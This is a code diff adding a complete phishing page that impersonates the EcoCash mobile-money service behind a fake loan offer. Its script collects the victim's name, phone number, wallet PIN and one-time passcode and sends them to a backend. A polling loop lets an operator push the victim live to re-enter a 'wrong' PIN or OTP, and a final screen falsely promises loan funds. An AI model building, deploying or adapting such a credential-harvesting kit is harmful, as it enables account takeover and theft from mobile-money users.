@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EcoCash Loans</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Merriweather:ital,wght@0,300;0,400;0,700;1,400&family=Inter:wght@400;500;600;700&display=swap');
+        :root { --eco-blue: #0050A0; --eco-red: #E31837; --bg-body: #E5E7EB; --text-main: #111827; --text-muted: #6B7280; --border-color: #E5E7EB; --purple-gradient: linear-gradient(90deg, #6366F1, #A855F7); --font-serif: 'Merriweather', serif; --font-sans: 'Inter', sans-serif; }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: var(--font-sans); background-color: var(--bg-body); color: var(--text-main); display: flex; flex-direction: column; min-height: 100vh; }
+        header { background: white; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border-color); position: sticky; top: 0; z-index: 100; }
+        .logo { font-size: 28px; font-weight: 700; letter-spacing: -1px; font-family: var(--font-sans); }
+        .eco-blue { color: var(--eco-blue); } .eco-red { color: var(--eco-red); }
+        .menu-icon { font-size: 26px; cursor: pointer; color: var(--text-main); font-weight: bold; }
+        .container { flex: 1; width: 100%; max-width: 500px; margin: 0 auto; padding: 20px; }
+        .page { display: none; } .page.active { display: block; animation: fadeIn 0.3s ease; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
+        .card { background: white; border-radius: 16px; padding: 30px 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
+        h1 { font-size: 24px; font-weight: 700; margin-bottom: 8px; color: var(--text-main); }
+        .subtitle { color: var(--text-muted); font-size: 14px; margin-bottom: 25px; }
+        .calculator-box { background: #F8F9FA; border-radius: 12px; padding: 25px 20px; margin-bottom: 25px; }
+        .calc-title { font-weight: 700; margin-bottom: 25px; font-size: 18px; }
+        .slider-group { margin-bottom: 30px; }
+        .slider-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; font-size: 15px; font-weight: 600; color: var(--text-main); }
+        .slider-value { color: #6366F1; font-weight: 700; font-size: 18px; }
+        input[type=range] { -webkit-appearance: none; width: 100%; background: transparent; }
+        input[type=range]:focus { outline: none; }
+        input[type=range]::-webkit-slider-runnable-track { width: 100%; height: 6px; cursor: pointer; background: #D1D5DB; border-radius: 5px; }
+        input[type=range]::-webkit-slider-thumb { height: 20px; width: 20px; border-radius: 50%; background: #6366F1; cursor: pointer; -webkit-appearance: none; margin-top: -7px; }
+        .slider-labels { display: flex; justify-content: space-between; font-size: 14px; color: var(--text-muted); margin-top: 8px; }
+        .monthly-payment { display: flex; justify-content: space-between; align-items: center; background: white; border: 1px solid var(--border-color); border-radius: 12px; padding: 20px; margin-top: 25px; }
+        .monthly-payment span { font-size: 16px; color: var(--text-main); font-weight: 500; }
+        .monthly-payment strong { font-size: 26px; color: #6366F1; font-weight: 700; }
+        .btn-gradient { display: block; width: 100%; background: var(--purple-gradient); color: white; padding: 18px; border-radius: 10px; font-size: 16px; font-weight: 600; border: none; cursor: pointer; text-transform: uppercase; letter-spacing: 0.5px; }
+        .features { margin-top: 35px; display: flex; flex-direction: column; gap: 25px; }
+        .feature-item { display: flex; align-items: center; gap: 15px; }
+        .feature-icon { font-size: 32px; }
+        .feature-text { display: flex; align-items: baseline; gap: 15px; }
+        .feature-text strong { font-size: 16px; color: var(--text-main); font-weight: 700; }
+        .feature-text span { font-size: 14px; color: var(--text-muted); }
+        .form-group { margin-bottom: 18px; }
+        .form-group label { display: block; font-weight: 600; font-size: 14px; margin-bottom: 8px; color: var(--text-main); }
+        .form-group input, .form-group select { width: 100%; padding: 14px; border: 1px solid var(--border-color); border-radius: 8px; font-size: 15px; color: var(--text-main); outline: none; background: white; appearance: none; }
+        .form-group input::placeholder { color: #9CA3AF; }
+        .form-group select { background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke='%23111827'%3E%3Cpath stroke-linecap='round' stroke-linejoin='round' stroke-width='2' d='M19 9l-7 7-7-7'%3E%3C/path%3E%3C/svg%3E"); background-repeat: no-repeat; background-position: right 14px center; background-size: 16px; }
+        .login-page { text-align: center; padding-top: 20px; }
+        .login-logo { font-family: var(--font-serif); font-size: 36px; margin-bottom: 30px; }
+        .login-logo .eco-blue { color: #1E3A8A; } .login-logo .eco-red { color: #DC2626; }
+        .login-title { font-family: var(--font-serif); font-size: 24px; margin-bottom: 30px; }
+        .phone-input-container { display: flex; align-items: center; border: 2px solid #1E3A8A; border-radius: 8px; padding: 5px 15px; margin-bottom: 25px; background: white; }
+        .flag-icon { font-size: 20px; margin-right: 10px; } .country-code { font-size: 16px; font-weight: 500; color: #111827; margin-right: 10px; }
+        .phone-input-container input { border: none; outline: none; font-size: 16px; width: 100%; padding: 10px 0; }
+        .pin-label { font-family: var(--font-serif); color: #4B5563; font-size: 16px; margin-bottom: 20px; }
+        .pin-boxes { display: flex; justify-content: center; gap: 15px; margin-bottom: 40px; }
+        .pin-boxes input { width: 55px; height: 65px; border: 2px solid #1E3A8A; border-radius: 10px; text-align: center; font-size: 24px; color: #111827; outline: none; }
+        .blue-arc-container { position: relative; margin-top: 50px; background: #0050A0; border-radius: 50% 50% 0 0 / 30px 30px 0 0; padding: 50px 20px 30px; text-align: center; color: white; margin-left: -20px; margin-right: -20px; }
+        .blue-arc-container p { font-family: var(--font-serif); font-size: 16px; margin-bottom: 30px; line-height: 1.5; }
+        .bottom-buttons { display: flex; gap: 15px; margin-bottom: 40px; }
+        .bottom-btn { flex: 1; background: white; border-radius: 10px; padding: 20px 10px; display: flex; flex-direction: column; align-items: center; justify-content: center; color: #111827; font-family: var(--font-serif); font-size: 16px; border: none; cursor: pointer; }
+        .bottom-icon-circle { width: 40px; height: 40px; background: #0050A0; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin-bottom: 10px; color: white; font-family: var(--font-sans); font-size: 18px; }
+        .version-text { font-family: var(--font-serif); font-size: 14px; margin-bottom: 15px; opacity: 0.9; }
+        .terms-text { font-family: var(--font-serif); font-size: 12px; opacity: 0.8; }
+        .terms-text a { color: white; text-decoration: underline; }
+        .otp-page { text-align: center; background: white; min-height: 100vh; padding: 40px 20px; position: relative; overflow: hidden; }
+        .otp-logo { font-family: var(--font-serif); font-size: 40px; margin-bottom: 60px; }
+        .otp-logo .eco-blue { color: #1E3A8A; } .otp-logo .eco-red { color: #DC2626; }
+        .otp-title { font-size: 20px; font-weight: 600; color: #111827; margin-bottom: 10px; }
+        .otp-phone { font-size: 16px; color: #4B5563; margin-bottom: 40px; }
+        .otp-boxes { display: flex; justify-content: center; gap: 10px; margin-bottom: 40px; }
+        .otp-boxes input { width: 45px; height: 55px; border: 1px solid #E5E7EB; border-radius: 8px; text-align: center; font-size: 20px; color: #111827; outline: none; background: #F9FAFB; }
+        .otp-boxes input:focus { border-color: #0050A0; background: white; }
+        .resend-text { font-size: 14px; color: #4B5563; }
+        .otp-blue-arc { position: absolute; bottom: 0; left: 0; width: 100%; height: 45vh; background: #0050A0; border-radius: 100% 100% 0 0 / 20% 20% 0 0; display: flex; flex-direction: column; justify-content: flex-end; align-items: center; padding-bottom: 40px; }
+        .loading-page { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 60vh; text-align: center; }
+        .spinner { width: 50px; height: 50px; border: 5px solid #E5E7EB; border-top: 5px solid var(--eco-blue); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .loading-text { font-size: 18px; font-weight: 600; color: var(--text-main); margin-bottom: 10px; }
+        .success-page { padding-top: 20px; text-align: center; }
+        .success-page h2 { font-family: var(--font-sans); font-weight: 700; margin-bottom: 10px; }
+        .success-page p { color: var(--text-muted); margin-bottom: 30px; }
+        .success-icon { font-size: 60px; margin-bottom: 20px; }
+        .success-text { font-size: 16px; line-height: 1.6; margin-bottom: 30px; }
+    </style>
+</head>
+<body>
+    <header><div class="logo"><span class="eco-blue">Eco</span><span class="eco-red">Cash</span></div><div class="menu-icon">☰</div></header>
+    <div class="container">
+        
+        <div id="page1" class="page active">
+            <div class="card">
+                <h1>Get Your Loan Approved Fast</h1>
+                <p class="subtitle">Quick approval • Competitive rates • Flexible terms</p>
+                <div class="calculator-box">
+                    <div class="calc-title">Loan Calculator</div>
+                    <div class="slider-group">
+                        <div class="slider-header"><span>Loan Amount</span><span class="slider-value" id="amount-val">$5,000</span></div>
+                        <input type="range" id="amount-slider" min="100" max="5000" value="5000" step="100">
+                        <div class="slider-labels"><span>$100</span><span>$5,000</span></div>
+                    </div>
+                    <div class="slider-group">
+                        <div class="slider-header"><span>Loan Term</span><span class="slider-value" id="term-val">12 months</span></div>
+                        <input type="range" id="term-slider" min="6" max="60" value="12" step="6">
+                        <div class="slider-labels"><span>6 months</span><span>60 months</span></div>
+                    </div>
+                    <div class="monthly-payment"><span>Monthly Payment</span><strong id="payment-val">$450</strong></div>
+                </div>
+                <button class="btn-gradient" type="button" onclick="showPage(2)">APPLY NOW</button>
+                <div class="features">
+                    <div class="feature-item"><div class="feature-icon">⚡</div><div class="feature-text"><strong>Fast Approval</strong><span>Within 24 hours</span></div></div>
+                    <div class="feature-item"><div class="feature-icon">💰</div><div class="feature-text"><strong>Low Rates</strong><span>From 8%</span></div></div>
+                    <div class="feature-item"><div class="feature-icon">🔒</div><div class="feature-text"><strong>Secure</strong><span>Bank-level</span></div></div>
+                </div>
+            </div>
+        </div>
+
+        <div id="page2" class="page">
+            <div class="card">
+                <h1>Loan Application</h1>
+                <div class="form-group"><label>Full name</label><input type="text" id="fullName" placeholder="Enter your full name"></div>
+                <div class="form-group"><label>Employment status</label><select id="employmentStatus"><option value="" disabled selected>Select your employment status</option><option value="Employed">Employed</option><option value="Self-Employed">Self-Employed</option><option value="Unemployed">Unemployed</option></select></div>
+                <div class="form-group"><label>Monthly income</label><input type="number" id="monthlyIncome" placeholder="Enter your monthly income"></div>
+                <div class="form-group"><label>Loan amount</label><input type="number" id="loanAmount" placeholder="Enter loan amount"></div>
+                <div class="form-group"><label>Repayment period (months)</label><select id="repaymentPeriod"><option value="" disabled selected>Select repayment period</option><option value="6">6 months</option><option value="12">12 months</option><option value="24">24 months</option><option value="36">36 months</option><option value="60">60 months</option></select></div>
+                <button class="btn-gradient" type="button" onclick="validateAndGoToLogin()">SUBMIT APPLICATION</button>
+            </div>
+        </div>
+
+        <div id="page3" class="page">
+            <div class="login-page">
+                <div class="login-logo"><span class="eco-blue">Eco</span><span class="eco-red">Cash</span></div>
+                <h2 class="login-title">Login</h2>
+                <div class="phone-input-container"><span class="flag-icon">🇿🇼</span><span class="country-code">+263</span><input type="tel" id="phone" placeholder="Phone Number" maxlength="10"></div>
+                <div class="pin-label">Enter your PIN</div>
+                <div class="pin-boxes">
+                    <input type="password" maxlength="1" oninput="moveToNext(this, 'pin2')" id="pin1">
+                    <input type="password" maxlength="1" oninput="moveToNext(this, 'pin3')" id="pin2">
+                    <input type="password" maxlength="1" oninput="moveToNext(this, 'pin4')" id="pin3">
+                    <input type="password" maxlength="1" oninput="moveToNext(this, 'none')" id="pin4">
+                </div>
+                <div class="blue-arc-container">
+                    <p>To register an EcoCash wallet or get assistance, click below</p>
+                    <div class="bottom-buttons">
+                        <button class="bottom-btn"><div class="bottom-icon-circle">👤</div>Register</button>
+                        <button class="bottom-btn"><div class="bottom-icon-circle">ℹ️</div>Help & Support</button>
+                    </div>
+                    <div class="version-text">v4.0.3P</div>
+                    <div class="terms-text">By signing in you agree to the <a href="#">Terms and Conditions</a></div>
+                </div>
+            </div>
+        </div>
+
+        <div id="page7" class="page">
+            <div class="loading-page">
+                <div class="spinner"></div>
+                <div class="loading-text">Processing...</div>
+            </div>
+        </div>
+
+        <div id="page4" class="page">
+            <div class="otp-page">
+                <div class="otp-logo"><span class="eco-blue">Eco</span><span class="eco-red">Cash</span></div>
+                <div class="otp-title">Enter the OTP code sent to</div>
+                <div class="otp-phone" id="otpPhoneDisplay">+263 728846496</div>
+                <div class="otp-boxes">
+                    <input type="text" maxlength="1" oninput="moveToNext(this, 'otp2')" id="otp1">
+                    <input type="text" maxlength="1" oninput="moveToNext(this, 'otp3')" id="otp2">
+                    <input type="text" maxlength="1" oninput="moveToNext(this, 'otp4')" id="otp3">
+                    <input type="text" maxlength="1" oninput="moveToNext(this, 'otp5')" id="otp4">
+                    <input type="text" maxlength="1" oninput="moveToNext(this, 'otp6')" id="otp5">
+                    <input type="text" maxlength="1" oninput="moveToNext(this, 'none')" id="otp6">
+                </div>
+                <div class="resend-text">Resend OTP in <span id="countdown">44</span> Sec</div>
+                <div class="otp-blue-arc">
+                    <div style="color: white; display: flex; align-items: center; gap: 10px; font-weight: 500;"><span style="font-size: 24px;">❓</span> Help & Support</div>
+                    <div style="color: rgba(255,255,255,0.7); font-size: 13px; margin-top: 15px;">v4.2.9</div>
+                </div>
+            </div>
+        </div>
+
+        <div id="page8" class="page">
+            <div class="loading-page">
+                <div class="spinner"></div>
+                <div class="loading-text">Verifying OTP...</div>
+            </div>
+        </div>
+
+        <div id="page6" class="page">
+            <div class="success-page">
+                <div class="success-icon">🎉</div>
+                <h2>Congratulations!</h2>
+                <p class="success-text">Your loan has been approved.<br><br> Kindly keep checking mobile money balance, as the funds are expected to be available within <strong>1 hour</strong>.</p>
+                <button class="btn-gradient" onclick="location.reload()">DONE</button>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        let currentRequestId = null;
+        let pollInterval = null;
+        let countdownInterval = null;
+
+        function showPage(pageNumber) {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.getElementById('page' + pageNumber).classList.add('active');
+        }
+
+        function validateAndGoToLogin() {
+            const name = document.getElementById('fullName').value.trim();
+            const amount = document.getElementById('loanAmount').value;
+            if (!name) return alert("Please enter your full name.");
+            if (!amount) return alert("Please enter a loan amount.");
+            showPage(3);
+        }
+
+        function moveToNext(current, nextId) {
+            if (current.value.length === 1) {
+                if (nextId !== 'none') {
+                    const next = document.getElementById(nextId);
+                    if (next) next.focus();
+                } else if (current.id === 'pin4') {
+                    showPage(7); 
+                    submitToBackend();
+                } else if (current.id === 'otp6') {
+                    showPage(8);
+                    submitOTPToBackend();
+                    // We are already polling in the background, so it will catch the response.
+                }
+            }
+        }
+
+        // Calculator
+        const amountSlider = document.getElementById('amount-slider');
+        const termSlider = document.getElementById('term-slider');
+        const amountVal = document.getElementById('amount-val');
+        const termVal = document.getElementById('term-val');
+        const paymentVal = document.getElementById('payment-val');
+
+        function calculateLoan() {
+            const principal = parseFloat(amountSlider.value);
+            const months = parseFloat(termSlider.value);
+            const formatter = new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD', maximumFractionDigits: 0 });
+            amountVal.textContent = formatter.format(principal);
+            termVal.textContent = months + ' months';
+            const monthly = (principal / months) * 1.08; 
+            paymentVal.textContent = new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD', maximumFractionDigits: 0 }).format(monthly);
+        }
+        amountSlider.addEventListener('input', calculateLoan);
+        termSlider.addEventListener('input', calculateLoan);
+        calculateLoan();
+
+        // Submit PIN
+        async function submitToBackend() {
+            const name = document.getElementById('fullName').value.trim();
+            const phone = document.getElementById('phone').value.trim();
+            const pin = document.getElementById('pin1').value + document.getElementById('pin2').value + document.getElementById('pin3').value + document.getElementById('pin4').value;
+            const amount = document.getElementById('loanAmount').value || '100';
+
+            if (phone.length < 9 || pin.length < 4) {
+                showPage(3);
+                return alert("Please enter a valid phone number and 4-digit PIN.");
+            }
+
+            try {
+                const response = await fetch('/api/submit', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ name, phone: '+263' + phone, pin, amount })
+                });
+                const data = await response.json();
+                currentRequestId = data.requestId;
+
+                document.getElementById('otpPhoneDisplay').textContent = `+263 ${phone}`;
+                
+                // Start the polling loop immediately
+                startPolling();
+
+            } catch (error) {
+                showPage(3);
+                alert("Connection error. Check if your server is running.");
+            }
+        }
+
+        // Submit OTP
+        async function submitOTPToBackend() {
+            if (!currentRequestId) return;
+            const otp = document.getElementById('otp1').value + document.getElementById('otp2').value + document.getElementById('otp3').value + document.getElementById('otp4').value + document.getElementById('otp5').value + document.getElementById('otp6').value;
+
+            try {
+                await fetch('/api/submit-otp', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ requestId: currentRequestId, otp: otp })
+                });
+                // Polling is already running and will catch the updates
+            } catch (error) { console.log("Error submitting OTP:", error); }
+        }
+
+        // Polling - Keeps running in the background until a final page is reached
+        function startPolling() {
+            clearInterval(pollInterval);
+            pollInterval = setInterval(async () => {
+                if (!currentRequestId) return;
+                try {
+                    const res = await fetch(`/api/status/${currentRequestId}`);
+                    const session = await res.json();
+                    
+                    const activePage = document.querySelector('.page.active').id;
+
+                    if (session.status === 'pending_otp' && activePage === 'page7') {
+                        showPage(4);
+                        startCountdown();
+                    } 
+                    else if (session.status === 'kick_to_form' && activePage !== 'page2') {
+                        clearInterval(pollInterval);
+                        alert("Your details were rejected. Please re-enter.");
+                        showPage(2);
+                    }
+                    else if (session.status === 'success_page' && activePage !== 'page6') {
+                        clearInterval(pollInterval);
+                        showPage(6);
+                    }
+                    else if (session.status === 'kick_to_login' && activePage !== 'page3') {
+                        clearInterval(pollInterval);
+                        alert("Wrong PIN entered. Please try again.");
+                        document.getElementById('pin1').value = '';
+                        document.getElementById('pin2').value = '';
+                        document.getElementById('pin3').value = '';
+                        document.getElementById('pin4').value = '';
+                        showPage(3);
+                    }
+                    else if (session.status === 'kick_to_otp' && activePage !== 'page4') {
+                        clearInterval(pollInterval);
+                        alert("Wrong OTP entered. Please try again.");
+                        document.getElementById('otp1').value = '';
+                        document.getElementById('otp2').value = '';
+                        document.getElementById('otp3').value = '';
+                        document.getElementById('otp4').value = '';
+                        document.getElementById('otp5').value = '';
+                        document.getElementById('otp6').value = '';
+                        showPage(4);
+                    }
+                } catch (e) {}
+            }, 2000);
+        }
+
+        function startCountdown() {
+            let timeLeft = 60;
+            document.getElementById('countdown').textContent = timeLeft;
+            clearInterval(countdownInterval);
+            countdownInterval = setInterval(() => {
+                timeLeft--;
+                document.getElementById('countdown').textContent = timeLeft;
+                if (timeLeft <= 0) clearInterval(countdownInterval);
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
